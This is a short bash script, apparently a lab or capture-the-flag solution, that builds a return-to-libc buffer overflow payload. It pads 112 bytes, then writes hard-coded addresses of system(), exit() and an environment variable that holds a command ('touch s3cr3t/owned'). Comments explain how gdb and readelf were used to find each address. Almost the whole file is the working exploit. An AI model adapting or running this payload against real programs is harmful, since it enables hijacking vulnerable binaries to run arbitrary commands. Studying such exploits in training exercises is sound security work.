 #!/bin/bash

#export EnvCmd="touch s3cr3t/owned"

#Envadress is at 0xffffde91
#Commands to find out: 
#x/s *((char **)environ)
#x/20
buffer=$(printf '\x41%.0s' {1..112}) #fill the buffer 
#offset_libc="f7df0000" , info proc mappings
#offset_system()="0003cd10"
system_addr="\x10\xcd\xe2\xf7" #offset_libc + offset system(), readelf -s /lib32/libc-2.27.so | grep system
exit_addr="\x70\xff\xe1\xf7"  #exit() function
ENVCMD_addr="\x97\xde\xff\xff"  #Envaddress + 0x7 to cut "EnvCmd="
echo -en "$buffer$system_addr$exit_addr$ENVCMD_addr"

